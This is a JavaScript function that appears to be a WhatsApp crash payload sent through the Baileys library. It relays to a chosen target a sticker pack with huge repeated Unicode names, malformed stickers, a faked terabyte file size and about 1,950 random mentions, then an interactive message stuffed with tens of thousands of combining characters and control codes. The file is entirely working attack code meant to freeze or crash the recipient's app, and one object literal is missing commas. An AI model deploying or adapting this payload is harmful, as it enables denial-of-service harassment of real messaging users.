async function BlankXVZ(sock, target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            stickerPackMessage: {
              stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
              name: "ꦾ".repeat(50000),
              publisher: "𑜦𑜠".repeat(50000),
              caption: " ¡m #Xa̲vɨêñʐʐ ",
              stickers: Array.from({ length: 100 }, () => ({
                fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                isAnimated: false,
                emojis: ["🧪", "⚠️"],
                accessibilityLabel: "",
                stickerSentTs: "PnX-ID-msg",
                isAvatar: true,
                isAiSticker: true,
                isLottie: true,
                mimetype: "application/pdf"
              })),
              fileLength: "1073741824000",
              fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
              fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
              mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
              directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",

              contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: [
                  target,
                  ...Array.from({ length: 1950 }, () =>
                    "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
                  )
                ]
              },

              packDescription: "",
              mediaKeyTimestamp: "1747502082",
              trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
              thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
              thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
              thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
              thumbnailHeight: 252,
              thumbnailWidth: 252,
              imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
              stickerPackSize: "999999999",
              stickerPackOrigin: "USER_CREATED"
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    const xavienz2 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },

          interactiveMessage: {
            header: {
              title: "¡m #Xa̲vɨêñʐʐ" + "ꦽ".repeat(15000) + "ꦾ".repeat(20000) + "𑆿𑆴𑆿".repeat(15000),
            },

            body: { text: " ~ " },

            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    icon: ""
                    flow_cta: "{}"
                    flow_message_version: "3"
                  })
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u0003".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u0005".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                }
              ],

              messageParamsJson: "{}".repeat(1000)
            }
          }
        }
      }
    };

    const msg2 = await generateWAMessageFromContent(
      target,
      xavienz2,
      { userJid: sock?.user?.id }
    );

    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });


  } catch (error) {
    console.error("Error:", error);
  }
}